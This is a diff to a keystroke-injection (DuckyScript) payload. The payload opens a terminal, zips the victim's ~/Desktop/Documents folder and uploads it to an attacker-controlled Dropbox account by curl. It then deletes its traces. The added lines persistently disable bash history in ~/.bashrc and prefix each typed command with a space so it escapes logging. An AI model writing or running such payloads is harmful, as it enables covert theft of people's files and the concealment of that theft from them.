@@ -47,31 +47,35 @@ DELAY 500
 STRING terminal
 DELAY 1000
 ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
 DELAY 500 
 CTRL c
 DELAY 1000
-STRING echo 'cd ~/Desktop && zip -r Documents.zip Documents && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <YOUR API KEY HERE>" -H "Dropbox-API-Arg: {\"path\": \"/Documents.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @Documents.zip' > upload.sh
+STRING  echo 'cd ~/Desktop && zip -r Documents.zip Documents && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <YOUR API KEY HERE>" -H "Dropbox-API-Arg: {\"path\": \"/Documents.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @Documents.zip' > upload.sh
 DELAY 1000
 ENTER
 DELAY 2000
-STRING chmod +x upload.sh
+STRING  chmod +x upload.sh
 DELAY 500
 ENTER
 DELAY 500
-STRING ./upload.sh
+STRING  ./upload.sh
 DELAY 500 
 ENTER
 DELAY 7000
 CTRL C
 DELAY 500 
-STRING rm upload.sh
+STRING  rm upload.sh
 DELAY 500
 ENTER
 DELAY 500
-STRING rm -r ~/Desktop/Documents.zip
+STRING  rm -r ~/Desktop/Documents.zip
 ENTER
 DELAY 500
-STRING CLEAR
+STRING  CLEAR
 DELAY 500
 ENTER
 DELAY 500
